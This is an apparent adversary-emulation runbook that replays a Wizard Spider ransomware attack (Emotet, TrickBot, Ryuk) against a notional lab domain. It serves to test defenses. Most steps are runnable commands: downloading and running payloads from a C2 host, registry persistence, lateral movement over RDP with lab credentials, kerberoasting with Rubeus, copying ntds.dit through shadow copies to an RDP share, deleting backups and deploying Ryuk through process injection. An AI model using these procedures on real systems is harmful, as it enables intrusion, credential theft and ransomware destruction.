# Scenario Overview

This scenario emulates Wizard Spider conducting a ransomware attack against a notional organization (Oz Inc).

This scenario emulates Wizard Spider TTPs based on  several malware specimens either used by or associated with the Wizard Spider actors:

1. Emotet
2. Trickbot
3. Ryuk

---

## Step 1 - Initial Compromise

Step1 emulates Wizard Spider gaining initial access using a Microsoft Word document.

The word document contains [obfuscated VBA macros](../../Resources/Emotet_Dropper) that downloads and executes a malicious DLL.

The [malicious DLL](../../Resources/Emotet) establishes a C2 session with the adversary control server.

The malicious DLL is based on Emotet.

Compromised user info:
User:	`judy@oz.local` 

Password: `Passw0rd!`

System: `10.0.0.7 / dorothy`

C2:	`192.168.0.4:80 HTTP; traffic is AES-encrypted with symmetric key and base64 encoded`

---

### ☣️ Procedures

Start the control server from your EL machine.

```bash
cd ~/wizard_spider/Resources/control_server
sudo ./controlServer
```
TODO: need passwords

SSH into Dorothy / 10.0.0.7 as user Judy:
```bash
ssh  judy@oz.local@10.0.0.7 'powershell.exe -Command "Invoke-WebRequest -Uri http://192.168.0.4:8080/getFile/adb.txt -OutFile $env:AppData\adb.vbs"'
```

```bash
ssh  judy@oz.local@10.0.0.7 'powershell.exe -Command "cscript.exe $env:AppData\adb.vbs"'
```

## Step 2 - Emotet Persistence

Wizard Spider establishes registry persistence by adding the registry key:

Path: `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`

Key: `blbdigital`

Value: `rundll32.exe %userprofile%\Ygyhlqt\Bx5jfmo\R43H.dll,Control_RunDLL`

The registry key is written using the `RegSetValueExA` WinAPI function.

---

### ☣️ Procedures

Open a horizontal terminal tab (right-click split horizontally).

Copy/paste the command in your lower terminal tab:

```bash
./evalsC2client.py --set-task DOROTHY_DABB41A5 1
```

## Step 3 - Emotet Host Discovery and Credential Collection

Wizard Spider first enumerates local processes using WinAPI functions: `CreateToolhelp32Snapshot` and `Process32First`.

Wizard Spider then reads a text file that contains credentials for another user, <bill@oz.local>, which will be used in the next step.

---

### ☣️ Procedures

Enumerate processes.

```bash
./evalsC2client.py --set-task DOROTHY_DABB41A5 2
```

[Source Code](../../Resources/Emotet/EmotetClientDLL/EmotetClientDLL/hostdiscovery.cpp#L172)

TODO: Scrape creds from text file.

```bash
./evalsC2client.py --set-task DESKTOP-9IA6T0M_BA673852 "read C:\\Users\\local_user\\Desktop\\dont_share.txt"
```

## Step 4 - Move Laterally Deploy TrickBot

During this step, Wizard Spider uses bill's credentials to RDP into Toto.

Wizard Spider uploads and executes a malicious EXE based on TrickBot.

Trickbot is uploaded to target using an RDP-mounted network share.

Once executed, Trickbot calls back to the C2 server over HTTP.

Compromised user info:

User:	`bill@oz.local`

Password: `Fall2021`

System: `10.0.0.8 / toto`

File Write (Tribot EXE): `%AppData%\uxtheme.exe`

C2:	`192.168.0.4:447 HTTP - no encryption or obfuscation`

---

### ☣️ Procedures

Change your RDP tab name to "RDP into Toto"

RDP into Toto and create RDP drive that has TrickBot folder structure

```bash
# Wizard Spider has used RDP for lateral movement.[5][2][8]

cd ~/
xfreerdp +clipboard /u:oz\\bill /p:"Fall2021" /v:10.0.0.8 /drive:X,wizard_spider/Resources/TrickBot/WNetval
```

Open `CMD.exe` and copy file to bill's AppData\Roaming

:warning: make sure you're in a `CMD` shell

```bash
ssh bill@oz.local@10.0.0.8 'copy \\\\tsclient\\X\\TrickBotClientExe.exe %AppData%\\uxtheme.exe;cd %AppData%; uxtheme.exe'
```

 Kick off exeuction by starting TrickBotClientExe.exe

```bash
cd %AppData%
uxtheme.exe
```

## Step 5 - TrickBot Discovery

In step 5 Wizard Spider uses TrickBot to perform detailed system discovery.

You will see TrickBot executing shell commands, such as systeminfo, sc.exe, net.exe, and so on.

Trickbot executes commands via the C standard library function, `system()`.

### ☣️ Procedures

From your C2 server tab, execute the following commands.

```bash
./evalsC2client.py --set-task TrickBot-Implant "systeminfo"
```

```bash
./evalsC2client.py --set-task TrickBot-Implant "sc query"
```

```bash
./evalsC2client.py --set-task TrickBot-Implant "net user"
```

```bash
./evalsC2client.py --set-task TrickBot-Implant  "net user /domain"
```

```bash
./evalsC2client.py --set-task TrickBot-Implant "ipconfig /all"
```

```bash
./evalsC2client.py --set-task TrickBot-Implant "netstat -tan"
```

```bash
./evalsC2client.py --set-task TrickBot-Implant "net config workstation"
```

```bash
./evalsC2client.py --set-task TrickBot-Implant "nltest /domain_trusts /all_trusts"
```

```bash
./evalsC2client.py --set-task TrickBot-Implant "whoami /groups"
```

## Step 6 - Kerberoast the DC

:microphone: `Voice Track:`

In this step Wizard Spider performs Kerberoasting using a public tool, Rubeus.

Through Kerberoasting, Wizard Spider obtains encrypted credentials for the domain admin, vfleming.

Wizard Spider cracks the credentials offline for use in the next step.

*Note: offline cracking isn't performed due to time constraints; its also not in scope for the evaluation, so we skip the behavior.*

---

### ☣️ Procedures

```bash
./evalsC2client.py --set-task TrickBot-Implant "get-file rubeus.exe"
```

```bash
./evalsC2client.py --set-task TrickBot-Implant "rubeus.exe kerberoast /domain:oz.local"
```

## Step 7 - Lateral Movement to DC

In step 7 Wizard Spider ingresses a new CyberSEAL remote agent called Jelly.

Using Jelly, Wizard Spider downloads a TrickBot variant to the DC using PowerShell's `Invoke-WebRequest` command.

Wizard Spider then uses Jelly to establish registry persistence to execute Trickbot when vflemming logs in.

Lastly, Wizard Spider invokes Jelly to enumerate the domain using the `adfind` utility.

Compromised user info:

User:	`vfleming@oz.local`
System: `10.0.0.4 / wizard`
Password: `q27VYN8xflPcYumbLMit`
File Write (Tribot EXE variant): `%AppData%\uxtheme.exe`
Registry Write:  `HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\`
Key: `Userinit`
Value: `Userinit.exe, $env:AppData\uxtheme.exe`


---

### ☣️ Procedures

Ingress Jelly to the domain controller.

```bash
scp /path/to/jelly vfleming@oz.local@10.0.0.4:"C:\Users\vfleming\."
wizard_spider/Resources/Ryuk/bin
```
Execute Jelly on the domain controller.
```bash
ssh vfleming@oz.local@10.0.0.4 'jelly start'
```
Task Jelly to download a trickbot variant (same binary with a zero appended to the very end)

```bash
jelly download http://192.168.0.4:8080/getFile/uxtheme.exe -OutFile $env:AppData\uxtheme.exe
```
Task Jelly to change the registry key.
```bash
jelly execute powershell.exe -Command 'Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, $env:AppData\uxtheme.exe" -Force'
```

```bash
jelly execute adfind -f "(objectcategory=group)"
```

## Step 8 - Dump Active Directory Database (ntds.dit)

During step 8, Wizard Spider tasks Jelly to create a volume shadow copy in order to collect the active directory database (ntds.dit).

Wizard Spider uses vssadmin to create the shadow copy.

Wizard Spider exfiltrates the shadow copy files using an RDP-mounted network share.

---

### ☣️ Procedures
Task Jelly to execute VSSadmin.
```bash
jelly execute 'vssadmin.exe create shadow /for=C:'
```

You will get output resembling the following:

`
vssadmin output:
    Shadow Copy ID: {cb0a1e0b-e4d7-44f4-aacb-daed56db01ce}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
`

:warning: Make sure the `\\\\?\GLOBALROOT...HarddiskVolumeShadowCopy1` path matches your output!

```bash
jelly execute copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit \\TSCLIENT\X\ntds.dit
```

```bash
jelly execute copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM \\TSCLIENT\X\VSC_SYSTEM_HIVE
```

```bash
jelly execute reg SAVE HKLM\SYSTEM \\TSCLIENT\X\SYSTEM_HIVE
```

## Step 9 - Ryuk Inhibit System Recovery

In step 9, Wizard Spider prepares to deploy an executable based on the Ryuk ransomware.

At the beginning of this step, Wizard Spider mounts the C$ share of a lateral host, toto / 10.0.0.8.

Files on Toto will be encrypted in the next step.

Next, Wizard Spider uploads two files to disk: kill.bat and window.bat.

These files are used to stop specific services and delete backups prior to encrypting the system.

---

### ☣️ Procedures

Mount share so Ryuk can encrypt lateral drives:

```bash
jelly execute net use Z: \\10.0.0.8\C$
```
```bash
# Ryuk has called kill.bat for stopping services, disabling services and killing processes.[1] 
jelly download path/to/kill.bat C:\Users\Public\kill.bat

jelly execute C:\Users\Public\kill.bat
```
```bash
# Ryuk has used vssadmin Delete Shadows /all /quiet to to delete volume shadow copies and vssadmin resize shadowstorage to force deletion of shadow copies created by third-party applications.[1]
jelly download path/to/window.bat C:\Users\Public\window.bat

jelly execute C:\Users\Public\window.bat
```

## Step 10 - Ryuk Encryption for Impact

In our final step, Wizard Spider uploads and executes Ryuk. Ryuk is uploaded using Jelly, and executed from CMD.

When Ryuk executes, it will first gain `SeDebugPrivilege`.

Ryuk will then and inject its own executable into a remote process,notepad.exe, via `WriteProcessMemory` and `CreateRemoteThread` WinAPI calls.

From the remote process, Ryuk will encrypt files on wizard/10.0.0.4's C:\Users\Public directory (recursive).

Next, Ryuk encrypts files on Toto/10.0.0.8 at \\C$\Users\Public (mounted on wizard as Z:).

Ryuk uses a symmetric key algorithm, AES256 to encrypt files.

Note that the symmetric key is itself encrypted with RSA2048.

---

### ☣️ Procedures


```bash
jelly download path/to/ryuk.exe C:\Users\Public\ryuk.exe
```

```bash
jelly execute C:\Windows\System32\notepad.exe
```

```bash
jelly execute C:\Users\Public\ryuk.exe --encrypt --process-name notepad.exe
```

To confirm that encryption worked, execute the following in CMD:

```bash
# confirm files are encrypted (local)
jelly execute type C:\Users\Public\Documents\Whitepaper_ekFUNt.rtf

# confirm encryption (remote)
jelly execute type \\toto\C$\Users\Public\Documents\Whitepaper_ekFUNt.rtf
```